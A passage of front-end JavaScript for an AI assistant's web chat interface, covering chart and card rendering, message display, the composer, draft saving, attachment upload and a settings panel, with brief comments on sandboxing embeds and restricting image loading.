  function niceMax(max) {
    if (max <= 0) return 1;
    const step = Math.pow(10, Math.floor(Math.log10(max)));
    for (const m of [1, 2, 2.5, 5, 10]) if (m * step >= max) return m * step;
    return 10 * step;
  }

  function chartTooltip(card) {
    let tip = card.querySelector('.bk-tip');
    if (!tip) { tip = el('div', 'bk-tip'); tip.hidden = true; card.appendChild(tip); }
    return tip;
  }

  function showTip(card, x, y, title, rows) {
    const tip = chartTooltip(card);
    tip.replaceChildren(el('div', 'bk-tip-title', title));
    rows.forEach(([name, value, color]) => {
      const row = el('div', 'bk-tip-row');
      const key = el('span', 'bk-tip-key');
      key.style.background = color;
      row.append(key, el('strong', '', value), el('span', 'bk-tip-name', name));
      tip.appendChild(row);
    });
    tip.hidden = false;
    const box = card.getBoundingClientRect();
    tip.style.left = `${Math.min(Math.max(x - box.left + 12, 4), box.width - tip.offsetWidth - 4)}px`;
    tip.style.top = `${Math.max(y - box.top - tip.offsetHeight - 10, 4)}px`;
  }

  function hideTip(card) {
    const tip = card.querySelector('.bk-tip');
    if (tip) tip.hidden = true;
  }

  function legend(items, shape) {
    const row = el('div', 'bk-legend');
    items.forEach(([name, color]) => {
      const item = el('span', 'bk-legend-item');
      const key = el('span', `bk-legend-key ${shape}`);
      key.style.background = color;
      item.append(key, document.createTextNode(name));
      row.appendChild(item);
    });
    return row;
  }

  function renderPie(card, chart) {
    const segments = chart.segments || [];
    const total = segments.reduce((sum, s) => sum + s.value, 0) || 1;
    const svg = svgEl('svg', { viewBox: '0 0 200 200', class: 'bk-pie', role: 'img' });
    let angle = -Math.PI / 2;
    segments.forEach((s, i) => {
      const color = SERIES_COLORS[i % SERIES_COLORS.length];
      const sweep = (s.value / total) * Math.PI * 2;
      const [x1, y1] = [100 + 90 * Math.cos(angle), 100 + 90 * Math.sin(angle)];
      const [x2, y2] = [100 + 90 * Math.cos(angle + sweep), 100 + 90 * Math.sin(angle + sweep)];
      const path = segments.length === 1
        ? svgEl('circle', { cx: 100, cy: 100, r: 90 })
        : svgEl('path', { d: `M100 100 L${x1} ${y1} A90 90 0 ${sweep > Math.PI ? 1 : 0} 1 ${x2} ${y2} Z` });
      path.setAttribute('fill', color);
      path.setAttribute('class', 'bk-mark');
      path.setAttribute('tabindex', '0');
      const pct = `${Math.round((s.value / total) * 100)}%`;
      const show = (e) => {
        const r = path.getBoundingClientRect();
        showTip(card, e.clientX || r.left + r.width / 2, e.clientY || r.top, s.label, [['', `${fmtNum(s.value)} · ${pct}`, color]]);
      };
      path.addEventListener('pointermove', show);
      path.addEventListener('focus', show);
      path.addEventListener('pointerleave', () => hideTip(card));
      path.addEventListener('blur', () => hideTip(card));
      svg.appendChild(path);
      angle += sweep;
    });
    const wrap = el('div', 'bk-pie-wrap');
    wrap.appendChild(svg);
    wrap.appendChild(legend(segments.map((s, i) => [s.label, SERIES_COLORS[i % SERIES_COLORS.length]]), 'box'));
    return wrap;
  }

  function renderSeriesChart(card, chart) {
    const cats = (chart.axis_config && chart.axis_config.categories) || [];
    const series = chart.series || [];
    const values = series.map((s) => cats.map((c) => {
      const p = (s.data || []).find((d) => d.label === c);
      return p ? Number(p.value) : 0;
    }));
    const W = 640, H = 260, L = 48, R = 12, T = 12, B = 34;
    const max = niceMax(Math.max(0, ...values.flat()));
    const min = Math.min(0, ...values.flat());
    const y = (v) => T + (H - T - B) * (1 - (v - min) / ((max - min) || 1));
    const band = (W - L - R) / Math.max(cats.length, 1);
    const xMid = (i) => L + band * (i + 0.5);
    const svg = svgEl('svg', { viewBox: `0 0 ${W} ${H}`, class: 'bk-chart', role: 'img' });

    for (let k = 0; k <= 4; k++) {
      const v = min + ((max - min) * k) / 4;
      svg.appendChild(svgEl('line', { x1: L, x2: W - R, y1: y(v), y2: y(v), class: 'bk-grid' }));
      const label = svgEl('text', { x: L - 6, y: y(v) + 4, class: 'bk-axis', 'text-anchor': 'end' });
      label.textContent = fmtNum(v);
      svg.appendChild(label);
    }
    const every = Math.ceil(cats.length / 10);
    cats.forEach((c, i) => {
      if (i % every) return;
      const label = svgEl('text', { x: xMid(i), y: H - B + 18, class: 'bk-axis', 'text-anchor': 'middle' });
      label.textContent = c;
      svg.appendChild(label);
    });

    const color = (j) => SERIES_COLORS[j % SERIES_COLORS.length];
    if (chart.type === 'bar') {
      const inner = band * 0.72;
      const w = Math.max((inner - 2 * (series.length - 1)) / series.length, 2);
      values.forEach((vals, j) => vals.forEach((v, i) => {
        const x = xMid(i) - inner / 2 + j * (w + 2);
        const top = y(Math.max(v, 0));
        const h = Math.max(Math.abs(y(v) - y(0)), 1);
        const r = Math.min(4, w / 2, h);
        svg.appendChild(svgEl('path', {
          d: `M${x} ${top + h} V${top + r} Q${x} ${top} ${x + r} ${top} H${x + w - r} Q${x + w} ${top} ${x + w} ${top + r} V${top + h} Z`,
          fill: color(j), class: 'bk-mark',
        }));
      }));
    } else {
      values.forEach((vals, j) => {
        const pts = vals.map((v, i) => `${xMid(i)},${y(v)}`);
        if (chart.type === 'area') {
          svg.appendChild(svgEl('polygon', {
            points: `${xMid(0)},${y(0)} ${pts.join(' ')} ${xMid(vals.length - 1)},${y(0)}`,
            fill: color(j), 'fill-opacity': series.length > 1 ? 0.18 : 0.28,
          }));
        }
        svg.appendChild(svgEl('polyline', { points: pts.join(' '), fill: 'none', stroke: color(j), 'stroke-width': 2 }));
      });
    }

    // One hit column per category: hover or focus shows every series there.
    const cross = svgEl('line', { y1: T, y2: H - B, class: 'bk-cross', visibility: 'hidden' });
    svg.appendChild(cross);
    cats.forEach((c, i) => {
      const hit = svgEl('rect', { x: L + band * i, y: T, width: band, height: H - T - B, fill: 'transparent', tabindex: 0 });
      const show = (e) => {
        if (chart.type !== 'bar') {
          cross.setAttribute('x1', xMid(i)); cross.setAttribute('x2', xMid(i));
          cross.setAttribute('visibility', 'visible');
        }
        const r = hit.getBoundingClientRect();
        showTip(card, e.clientX || r.left + r.width / 2, e.clientY || r.top,
          c, series.map((s, j) => [s.name, fmtNum(values[j][i]), color(j)]));
      };
      const hide = () => { cross.setAttribute('visibility', 'hidden'); hideTip(card); };
      hit.addEventListener('pointermove', show);
      hit.addEventListener('focus', show);
      hit.addEventListener('pointerleave', hide);
      hit.addEventListener('blur', hide);
      svg.appendChild(hit);
    });

    const wrap = el('div', 'bk-series-wrap');
    if (chart.axis_config && chart.axis_config.y_label) wrap.appendChild(el('div', 'bk-axis-title', chart.axis_config.y_label));
    wrap.appendChild(svg);
    if (chart.axis_config && chart.axis_config.x_label) wrap.appendChild(el('div', 'bk-axis-title x', chart.axis_config.x_label));
    if (series.length > 1) wrap.appendChild(legend(series.map((s, j) => [s.name, color(j)]), chart.type === 'bar' ? 'box' : 'line'));
    return wrap;
  }

  function renderChart(block) {
    const card = el('figure', 'bk-chart-card');
    card.appendChild(el('figcaption', 'bk-chart-title', block.title || ''));
    const chart = block.chart || {};
    card.appendChild(chart.type === 'pie' ? renderPie(card, chart) : renderSeriesChart(card, chart));
    return card;
  }

  function renderInput(element) {
    const id = element.action_id || '';
    const options = element.options || [];
    if (element.type === 'static_select') {
      const select = el('select', 'bk-select');
      select.dataset.actionId = id;
      select.appendChild(el('option', '', textOf(element.placeholder) || 'Choose')).value = '';
      options.forEach((o) => {
        const opt = el('option', '', textOf(o.text));
        opt.value = o.value;
        if (element.initial_option && element.initial_option.value === o.value) opt.selected = true;
        select.appendChild(opt);
      });
      return select;
    }
    if (element.type === 'checkboxes' || element.type === 'radio_buttons') {
      const group = el('div', 'bk-choices');
      group.dataset.actionId = id;
      const chosen = new Set([...(element.initial_options || []), ...(element.initial_option ? [element.initial_option] : [])].map((o) => o.value));
      const name = `${id}-${Math.random().toString(36).slice(2)}`;
      options.forEach((o) => {
        const label = el('label', 'bk-choice');
        const input = el('input');
        input.type = element.type === 'checkboxes' ? 'checkbox' : 'radio';
        input.name = name;
        input.value = o.value;
        input.dataset.label = textOf(o.text);
        input.checked = chosen.has(o.value);
        label.append(input, document.createTextNode(textOf(o.text)));
        group.appendChild(label);
      });
      return group;
    }
    if (element.type === 'datepicker') {
      const input = el('input', 'bk-date');
      input.type = 'date';
      input.dataset.actionId = id;
      if (element.initial_date) input.value = element.initial_date;
      input.title = textOf(element.placeholder);
      return input;
    }
    return null;
  }

  // What every input in the card is set to, in the same words as agent/block_state.py.
  function cardState(card) {
    const lines = [];
    card.querySelectorAll('[data-action-id]').forEach((node) => {
      const name = node.dataset.actionId.replace(/^card_input_/, '');
      let value;
      if (node.tagName === 'SELECT') {
        value = node.value ? `${node.selectedOptions[0].textContent} (${node.value})` : 'nothing selected';
      } else if (node.tagName === 'INPUT') {
        value = node.value || 'not set';
      } else {
        const chosen = [...node.querySelectorAll('input:checked')].map((i) => (i.dataset.label === i.value ? i.value : `${i.dataset.label} (${i.value})`));
        value = chosen.join(', ') || 'nothing selected';
      }
      lines.push(`- ${name}: ${value}`);
    });
    return lines;
  }

  function renderActions(block, card) {
    const row = el('div', 'bk-actions');
    (block.elements || []).forEach((element) => {
      if (element.type !== 'button') {
        const input = renderInput(element);
        if (input) row.appendChild(input);
        return;
      }
      const label = textOf(element.text);
      if (element.url) {
        const a = el('a', `bk-button${element.style ? ` ${element.style}` : ''}`, label);
        a.href = safeUrl(element.url);
        a.target = '_blank';
        a.rel = 'noopener noreferrer';
        row.appendChild(a);
        return;
      }
      const button = el('button', `bk-button${element.style ? ` ${element.style}` : ''}`, label);
      button.type = 'button';
      if (!label || !/^card_prompt_/.test(element.action_id || '')) {
        button.disabled = true;
      } else {
        // Asks the label the person sees, never a hidden prompt (listeners/actions/card_prompt_actions.py).
        button.addEventListener('click', () => {
          const state = cardState(card);
          const text = `${label}\n[from a button click: they clicked the "${label}" button on your card. ` +
            "This is the button's label, not a message they typed: do what the button offers.]" +
            (state.length ? `\nThe card's inputs at the time:\n${state.join('\n')}` : '');
          if (cardPromptSender) cardPromptSender(text);
        });
      }
      row.appendChild(button);
    });
    return row;
  }

  function renderBlocks(blocks) {
    const card = el('div', 'bk-card');
    (blocks || []).forEach((block) => {
      switch (block.type) {
        case 'header':
          card.appendChild(el('h3', 'bk-header', textOf(block.text)));
          break;
        case 'section': {
          if (block.text) {
            const div = el('div', 'bk-section');
            div.innerHTML = mrkdwnToHtml(textOf(block.text));
            card.appendChild(div);
          }
          if (block.fields) {
            const grid = el('div', 'bk-fields');
            block.fields.forEach((f) => {
              const div = el('div', 'bk-field');
              div.innerHTML = mrkdwnToHtml(textOf(f));
              grid.appendChild(div);
            });
            card.appendChild(grid);
          }
          break;
        }
        case 'markdown': {
          const div = el('div', 'bk-section');
          div.innerHTML = renderMarkdown(block.text || '');
          card.appendChild(div);
          break;
        }
        case 'context': {
          const div = el('div', 'bk-context');
          div.innerHTML = (block.elements || []).filter((e) => e.text).map((e) => mrkdwnToHtml(e.text)).join(' ');
          card.appendChild(div);
          break;
        }
        case 'divider':
          card.appendChild(el('hr', 'bk-divider'));
          break;
        case 'image': {
          // Same rule as images in replies (isLoadableImage): a card can be made at anyone's
          // request, and loading its image from anywhere would send what's in the URL there.
          if (!isLoadableImage(block.image_url)) {
            const link = el('a', 'bk-link', block.alt_text || 'image');
            link.href = safeUrl(block.image_url) || '#';
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            card.appendChild(link);
            break;
          }
          const img = el('img', 'bk-image');
          img.src = safeUrl(block.image_url);
          img.alt = block.alt_text || '';
          img.loading = 'lazy';
          card.appendChild(img);
          break;
        }
        case 'table':
        case 'data_table':
          card.appendChild(renderTable(block));
          break;
        case 'data_visualization':
          card.appendChild(renderChart(block));
          break;
        case 'actions':
          card.appendChild(renderActions(block, card));
          break;
        default:
          break;
      }
    });
    linkifyExternal(card);
    return card;
  }

  function handleAgentMessage(ev) {
    const turn = ensureTurn();
    const content = turn.querySelector('.turn-content');
    clearThinking(turn);

    if (ev.variant === 'final') {
      const div = document.createElement('div');
      div.innerHTML = renderMarkdown(ev.text || '');
      linkifyExternal(div);
      content.appendChild(div);
      return;
    }
    if (ev.variant === 'status') {
      const line = document.createElement('div');
      line.className = 'status-line';
      line.innerHTML = renderMarkdown(ev.text || '');
      linkifyExternal(line);
      content.appendChild(line);
      return;
    }
    if (ev.variant === 'image') {
      const card = document.createElement('div');
      card.className = 'image-card';
      const img = document.createElement('img');
      img.src = safeUrl(ev.url);
      img.alt = ev.alt_text || '';
      card.appendChild(img);
      content.appendChild(card);
      return;
    }
    if (ev.variant === 'file') {
      const card = document.createElement('div');
      card.className = 'file-card';

      if (isImageFilename(ev.filename || ev.url)) {
        const img = document.createElement('img');
        img.className = 'file-preview';
        img.src = safeUrl(ev.url);
        img.alt = ev.filename || '';
        card.appendChild(img);
      }

      const row = document.createElement('div');
      row.className = 'file-row';

      const link = document.createElement('a');
      link.href = safeUrl(ev.url);
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      link.className = 'file-label';
      link.textContent = ev.title || ev.filename || 'File';
      row.appendChild(link);

      const dl = document.createElement('a');
      dl.href = safeUrl(ev.url);
      dl.download = ev.filename || '';
      dl.className = 'file-download';
      dl.title = 'Download';
      dl.setAttribute('aria-label', `Download ${ev.filename || 'file'}`);
      dl.appendChild(icon('i-download'));
      row.appendChild(dl);

      card.appendChild(row);
      content.appendChild(card);
      return;
    }
    if (ev.variant === 'card') {
      content.appendChild(renderBlocks(ev.blocks));
      return;
    }
    if (ev.variant === 'embed') {
      // A live embed (desktop/browser stream, rendered HTML, a whiteboard) —
      // shown inline as a real iframe, the way Slack unfurls it, not as a
      // static link. Sized generously and never overflow-clipped, since a
      // cropped desktop stream is worse than a link.
      const card = document.createElement('div');
      card.className = 'embed-card';

      const head = document.createElement('div');
      head.className = 'embed-head';
      const link = document.createElement('a');
      link.href = safeUrl(ev.url);
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      link.className = 'embed-label';
      link.textContent = ev.title || ev.url;
      head.appendChild(link);
      card.appendChild(head);

      const frame = document.createElement('iframe');
      frame.className = 'embed-frame';
      frame.src = safeUrl(ev.url);
      frame.title = ev.title || 'Embedded content';
      frame.loading = 'lazy';
      frame.allow = 'clipboard-write; fullscreen';
      frame.referrerPolicy = 'no-referrer';
      // allow-same-origin is safe here because the embed is always a
      // cross-origin URL (the coolton file server / whiteboard / desktop
      // stream, never this page's own origin) — it's what the noVNC desktop
      // stream needs for its own storage/WebSocket use. Deliberately no
      // allow-top-navigation: framed content (including model-authored HTML
      // via send_html_embed) must never be able to navigate this page away.
      frame.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
      card.appendChild(frame);

      if (ev.text && ev.text !== ev.title) {
        const caption = document.createElement('div');
        caption.className = 'embed-caption';
        caption.textContent = ev.text;
        card.appendChild(caption);
      }

      content.appendChild(card);
    }
  }

  function endTurn(ev, opts) {
    const turn = activeTurnEl || ensureTurn();
    clearThinking(turn);
    turn.classList.remove('working');
    const failed = ev.state === 'error' || ev.state === 'stopped';
    if (failed) turn.classList.add('failed');

    if (turn.querySelectorAll('.spine-node').length) {
      turn.querySelector('.spine-group').hidden = false;
      updateStepCount(turn);
      // Finished work collapses to a single line; open it to read the log back.
      turn.classList.add('steps-collapsed');
    }

    if (failed) {
      const note = document.createElement('div');
      note.className = `turn-end-note state-${ev.state}`;
      note.textContent = ev.state === 'stopped' ? 'Stopped' : (ev.reason || 'Something went wrong');
      turn.querySelector('.turn-content').prepend(note);
    } else if (ev.state === 'skipped') {
      const note = document.createElement('div');
      note.className = 'turn-end-note state-skipped';
      note.textContent = 'Skipped';
      turn.querySelector('.turn-content').prepend(note);
    }

    activeTurnEl = null;
    isStopping = false;
    if (opts && opts.replay) return;
    isWorking = false;
    updateComposerState();
    updateStatusBar('idle');
    markSidebarWorking(currentConversationId, false);
    refreshSidebarMeta();
  }

  // A session names itself after its first message (web/runner.py), so the
  // sidebar and header pick that up once the turn it started has landed.
  // Also the only thing that notices a turn finishing in a session that
  // isn't the one currently open — there's no SSE stream for it (that only
  // exists for the current conversation), so its "working" dot would
  // otherwise stay lit forever once that background turn lands. Called right
  // after our own turn starts/ends, and polled on a timer (below) so a
  // turn finishing elsewhere is caught too.
  function refreshSidebarMeta() {
    apiJson('/api/conversations').then((rows) => {
      for (const row of rows) {
        const title = (row.title || '').trim();
        setSidebarTitle(row.id, title);
        markSidebarWorking(row.id, !!row.working);
        if (row.id === currentConversationId && statusTitleEl.isConnected) {
          statusTitleEl.textContent = title || UNTITLED;
        }
      }
    }).catch(() => {});
  }

  function handleReaction(ev) {
    const target = messageElBySeq.get(ev.target_seq);
    const container = target && target.querySelector('.row-reactions');
    if (!container) return;
    if (ev.op === 'add') {
      const badge = document.createElement('span');
      badge.className = 'reaction-badge';
      const glyph = emojiFor(ev.emoji);
      if (glyph) {
        badge.textContent = glyph;
      } else {
        const img = document.createElement('img');
        img.className = 'emoji-img';
        img.src = CUSTOM_EMOJI_URL(ev.emoji);
        img.alt = `:${ev.emoji}:`;
        badge.appendChild(img);
      }
      badge.title = `:${ev.emoji}:`;
      badge.dataset.emoji = ev.emoji;
      container.appendChild(badge);
    } else {
      const badge = container.querySelector(`[data-emoji="${CSS.escape(ev.emoji)}"]`);
      if (badge) badge.remove();
    }
  }

  // ---------------------------------------------------------------------
  // Renaming a session
  // ---------------------------------------------------------------------

  statusTitleEl.addEventListener('click', () => {
    if (!currentConversationId) return;
    const current = statusTitleEl.textContent === UNTITLED ? '' : statusTitleEl.textContent;
    const input = document.createElement('input');
    input.className = 'title-input';
    input.value = current;
    input.placeholder = 'Name this session';
    input.maxLength = 80;

    let settled = false;
    const finish = async (save) => {
      if (settled) return;
      settled = true;
      const title = save ? input.value.trim() : current;
      input.replaceWith(statusTitleEl);
      statusTitleEl.textContent = title || UNTITLED;
      if (save && title !== current) {
        setSidebarTitle(currentConversationId, title);
        try {
          await api(`/api/conversations/${currentConversationId}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ title }),
          });
        } catch (err) {
          console.error('Failed to rename session', err);
        }
      }
    };

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); finish(true); }
      if (e.key === 'Escape') { e.preventDefault(); finish(false); }
    });
    input.addEventListener('blur', () => finish(true));

    statusTitleEl.replaceWith(input);
    input.focus();
    input.select();
  });

  // ---------------------------------------------------------------------
  // Composer
  // ---------------------------------------------------------------------

  function updateComposerState() {
    // Send stays available while coolton works — a message sent mid-turn steers
    // the run in flight rather than queueing a second one.
    stopBtn.hidden = !isWorking;
    stopBtn.disabled = isStopping;
  }

  function autoGrow() {
    composerInput.style.height = 'auto';
    composerInput.style.height = Math.min(composerInput.scrollHeight, 200) + 'px';
  }

  // ---------------------------------------------------------------------
  // Drafts: what's typed but not sent, per session, in localStorage — so a
  // closed tab or a session switch never loses it. The empty "new session"
  // state has its own key, restored whenever you're back on a fresh draft.
  // ---------------------------------------------------------------------

  function saveDraft() {
    try { localStorage.setItem(draftKey(), composerInput.value); } catch (e) { /* full? give up */ }
  }

  function clearDraft() {
    try { localStorage.removeItem(draftKey()); } catch (e) { }
  }

  function restoreDraft() {
    try { composerInput.value = localStorage.getItem(draftKey()) || ''; } catch (e) { }
    autoGrow();
  }

  function saveCurrentDraftBeforeSwitch() {
    if (composerInput !== document.activeElement) {
      // The user is mid-typing; the switch is just a click on the sidebar.
      // Saving on every input already covered this, but capture the final
      // keystroke anyway in case the blur hasn't flushed.
    }
    saveDraft();
  }

  composerInput.addEventListener('input', () => { autoGrow(); saveDraft(); });

  composerInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      composerEl.requestSubmit();
      return;
    }
    if ((e.ctrlKey || e.metaKey) && (e.key === 'b' || e.key === 'i')) {
      e.preventDefault();
      applyMdAction(e.key === 'b' ? 'bold' : 'italic');
    }
  });

  // ---------------------------------------------------------------------
  // Formatting toolbar: inserts markdown around the selection (or a
  // placeholder when there's no selection). Typing markdown by hand renders
  // exactly the same way.
  // ---------------------------------------------------------------------

  function applyMdAction(type) {
    const ta = composerInput;
    const start = ta.selectionStart;
    const end = ta.selectionEnd;
    const selected = ta.value.slice(start, end);

    if (type === 'ul' || type === 'ol' || type === 'quote') {
      const prefix = type === 'ul' ? '- ' : type === 'ol' ? '1. ' : '> ';
      const lines = selected.split('\n');
      const prefixed = lines.map((line, i) => {
        if (!line.trim()) return line;
        return type === 'ol' ? `${i + 1}. ${line}` : prefix + line;
      }).join('\n');
      ta.setRangeText(prefixed, start, end, 'end');
      ta.focus();
      autoGrow();
      saveDraft();
      return;
    }

    const defs = {
      bold: ['**', '**', 'bold text'],
      italic: ['*', '*', 'italic text'],
      strike: ['~~', '~~', 'strikethrough'],
      code: ['`', '`', 'code'],
      codeblock: ['\n```\n', '\n```\n', 'code'],
      link: ['[', '](https://example.com)', 'link text'],
    };
    const [before, after, placeholder] = defs[type] || [];
    if (!before) return;
    const content = selected || placeholder;
    ta.setRangeText(before + content + after, start, end, 'end');
    const cursor = start + before.length;
    ta.focus();
    ta.selectionStart = cursor;
    ta.selectionEnd = cursor + content.length;
    autoGrow();
    saveDraft();
  }

  mdToolbar.addEventListener('click', (e) => {
    const btn = e.target.closest('.md-tool');
    if (!btn) return;
    applyMdAction(btn.dataset.md);
  });

  async function sendText(text, attachments) {
    if (!currentConversationId) await createConversation();
    if (!currentConversationId) return;
    try {
      await api(`/api/conversations/${currentConversationId}/messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text, attachment_ids: (attachments || []).map((a) => a.id) }),
      });
    } catch (err) {
      console.error('Failed to send message', err);
    }
  }
  cardPromptSender = sendText;

  composerEl.addEventListener('submit', async (e) => {
    e.preventDefault();
    const text = composerInput.value.trim();
    if (!text && !pendingAttachments.length) return;

    const attachments = pendingAttachments;
    pendingAttachments = [];
    renderAttachmentTray();

    // Optimistic: show the message the instant Enter is pressed; the server
    // event morphs this row into the confirmed one when it lands (see
    // renderUserMessage), so an empty "waiting" gap never appears.
    const optimisticNode = renderOptimisticUserMessage(text, attachments);

    composerInput.value = '';
    autoGrow();
    clearDraft();

    try {
      await sendText(text, attachments);
    } catch (err) {
      console.error('Failed to send message', err);
      pendingOptimistic = pendingOptimistic.filter((p) => p.node !== optimisticNode);
      optimisticNode.remove();
      if (!composerInput.value.trim()) {
        composerInput.value = text;
        autoGrow();
        saveDraft();
      }
    }
  });

  stopBtn.addEventListener('click', async () => {
    if (!currentConversationId || isStopping) return;
    // Say so immediately: the halt lands at coolton's next checkpoint, which can
    // be a second or two into a long tool call.
    isStopping = true;
    updateComposerState();
    updateStatusBar();
    try {
      await api(`/api/conversations/${currentConversationId}/stop`, { method: 'POST' });
    } catch (err) {
      console.error('Failed to stop the run', err);
      isStopping = false;
      updateComposerState();
      updateStatusBar();
    }
  });

  attachBtn.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', async () => {
    for (const file of fileInput.files) await uploadAttachment(file);
    fileInput.value = '';
  });

  composerEl.addEventListener('dragover', (e) => e.preventDefault());
  composerEl.addEventListener('drop', async (e) => {
    e.preventDefault();
    for (const file of e.dataTransfer.files) await uploadAttachment(file);
  });
  composerInput.addEventListener('paste', async (e) => {
    const files = Array.from((e.clipboardData && e.clipboardData.files) || []);
    for (const file of files) await uploadAttachment(file);
  });

  async function uploadAttachment(file) {
    if (!currentConversationId) await createConversation();
    if (!currentConversationId) return;
    const chip = document.createElement('div');
    chip.className = 'attachment-chip';
    chip.textContent = `Uploading ${file.name}…`;
    attachmentTray.hidden = false;
    attachmentTray.appendChild(chip);
    try {
      const form = new FormData();
      form.append('file', file);
      const resp = await api(`/api/conversations/${currentConversationId}/attachments`, { method: 'POST', body: form });
      if (!resp.ok) throw new Error(`upload failed: ${resp.status}`);
      const meta = await resp.json();
      meta.media_type = file.type;
      pendingAttachments.push(meta);
      renderAttachmentTray();
    } catch (err) {
      console.error('Attachment upload failed', err);
      chip.remove();
      if (!attachmentTray.children.length) attachmentTray.hidden = true;
    }
  }

  function renderAttachmentTray() {
    attachmentTray.innerHTML = '';
    if (!pendingAttachments.length) { attachmentTray.hidden = true; return; }
    attachmentTray.hidden = false;
    for (const a of pendingAttachments) {
      const chip = renderAttachmentChip(a);
      const remove = document.createElement('button');
      remove.type = 'button';
      remove.className = 'remove-attachment';
      remove.textContent = '×';
      remove.title = `Remove ${a.name || 'attachment'}`;
      remove.addEventListener('click', () => {
        pendingAttachments = pendingAttachments.filter((x) => x.id !== a.id);
        renderAttachmentTray();
      });
      chip.appendChild(remove);
      attachmentTray.appendChild(chip);
    }
  }

  // ---------------------------------------------------------------------
  // Drawer (mobile)
  // ---------------------------------------------------------------------

  function closeDrawer() { appEl.classList.remove('drawer-open'); }
  drawerToggle.addEventListener('click', () => appEl.classList.toggle('drawer-open'));
  backdrop.addEventListener('click', closeDrawer);

  // ---------------------------------------------------------------------
  // Settings popup: mirrors the Slack App Home controls (policy consent,
  // BYOK endpoints, instructions, reminders, fallback cache, MCP servers)
  // as REST-backed sections. Same stores, same validation as the Slack
  // handlers — a change made here is immediately visible there and back.
  // ---------------------------------------------------------------------

  let settingsData = null;
  let settingsSection = 'policy';
  let byokEditId = null;

  const SETTINGS_SECTIONS = [
    { id: 'policy', label: 'Policy consent', icon: 'i-shield' },
    { id: 'endpoints', label: 'BYOK endpoints', icon: 'i-key' },
    { id: 'instructions', label: 'Instructions', icon: 'i-book' },
    { id: 'reminders', label: 'Reminders', icon: 'i-bell' },
    { id: 'cache', label: 'Fallback cache', icon: 'i-zap' },
    { id: 'mcp', label: 'MCP servers', icon: 'i-plug' },
  ];

  async function openSettings() {
    try {
      settingsData = await apiJson('/api/settings');
    } catch (err) {
      return;
    }
    renderSettingsNav();
    renderSettingsSection();
    settingsModal.hidden = false;
    settingsCloseBtn.focus();
  }

  function closeSettings() {
    settingsModal.hidden = true;
  }

  async function refreshSettings() {
    try {
      settingsData = await apiJson('/api/settings');
    } catch (err) {
      return;
    }
    renderSettingsSection();
  }

  function renderSettingsNav() {
    settingsNav.innerHTML = '';
    const head = el('div', 'settings-nav-head');
    const img = document.createElement('img');
    img.src = settingsData.avatar_url;
    img.alt = '';
    head.append(img, el('span', '', settingsData.display_name));
    settingsNav.append(head);

    const list = el('div', 'settings-nav-list');
    for (const s of SETTINGS_SECTIONS) {
      const btn = el('button', 'settings-nav-item');
      btn.type = 'button';
      btn.dataset.section = s.id;
      btn.classList.toggle('active', s.id === settingsSection);
      btn.append(icon(s.icon), el('span', '', s.label));
      btn.addEventListener('click', () => {
        settingsSection = s.id;
        renderSettingsNav();
        renderSettingsSection();
      });
      list.appendChild(btn);
    }
    settingsNav.append(list);

    const signout = document.createElement('a');
    signout.className = 'settings-nav-signout';
    signout.href = '/oauth/logout';
    signout.append(icon('i-user'), el('span', '', 'Sign out'));
    settingsNav.append(signout);
  }

  function renderSettingsSection() {
    settingsBody.innerHTML = '';
    if (!settingsData) return;
    const renderers = {
      policy: renderSectionPolicy,
      endpoints: renderSectionEndpoints,
      instructions: renderSectionInstructions,
      reminders: renderSectionReminders,
      cache: renderSectionCache,
      mcp: renderSectionMcp,
    };
    (renderers[settingsSection] || renderSectionPolicy)();
  }

  function settingsNote(text, kind) {
    return el('div', 'settings-note' + (kind ? ' ' + kind : ''), text);
  }

  function settingsError(text) {
    return settingsNote(text, 'err');
  }

  function renderSectionPolicy() {
    const box = el('div');
    box.append(el('h2', 'settings-section-title', 'Policy consent'));
    box.append(el('p', 'settings-section-sub',
      'What Coolton may do with your data and messages, and the rules for using it. The full policy lives in the Slack canvas linked below.'));

    const row = el('div', 'settings-row');
    const label = el('div', 'settings-row-label');
    label.append(el('div', 'settings-row-title', settingsData.policy.consent ? 'You’re opted in' : 'You haven’t opted in yet'));
    label.append(el('div', 'settings-row-sub', settingsData.policy.consent
      ? 'Coolton can process your requests under the policy.'
      : 'Opt in before asking coolton to do anything — it won’t run without consent.'));
    row.appendChild(label);

    const actions = el('div', 'settings-actions');
    if (settingsData.policy.consent) {
      const out = el('button', 'settings-btn danger', 'Opt out');
      out.addEventListener('click', async () => {
        try {
          await apiJson('/api/settings/policy/opt-out', { method: 'POST' });
          settingsData.policy.consent = false;
          renderSettingsSection();
        } catch (err) {
          settingsBody.appendChild(settingsError('Couldn’t record opt-out.'));
        }
      });
      actions.appendChild(out);
    } else {
      const join = el('button', 'settings-btn primary', 'Opt in and join channel');
      const nojoin = el('button', 'settings-btn', 'Opt in without joining');
      join.addEventListener('click', () => acceptPolicy(true, null));
      nojoin.addEventListener('click', () => acceptPolicy(false, null));
      actions.append(join, nojoin);
    }
    row.appendChild(actions);
    box.appendChild(row);

    const link = document.createElement('a');
    link.href = policyUrl();
    link.target = '_blank';
    link.rel = 'noopener noreferrer';
    link.className = 'settings-btn';
    link.append(icon('i-book'), el('span', '', 'Read the policy'));
    box.appendChild(link);
    settingsBody.appendChild(box);
  }

  function renderSectionEndpoints() {
    const box = el('div');
    box.append(el('h2', 'settings-section-title', 'BYOK endpoints'));
    box.append(el('p', 'settings-section-sub',
      'Bring-your-own-key: OpenAI-compatible endpoints used instead of the global key, for text and/or image generation.'));

    const eps = settingsData.endpoints || [];
    if (!eps.length) {
      box.append(el('p', 'settings-empty', 'No endpoints configured.'));
    } else {
      for (const ep of eps) {
        const row = el('div', 'settings-row');
        const label = el('div', 'settings-row-label');
        const title = el('div', 'settings-row-title', ep.name);
        const tags = [];
        if (ep.id === settingsData.text_endpoint_id) tags.push('text');
        if (ep.id === settingsData.image_endpoint_id) tags.push('image');
        if (tags.length) title.append(' ', el('span', 'settings-note ok', `[${tags.join(', ')}]`));
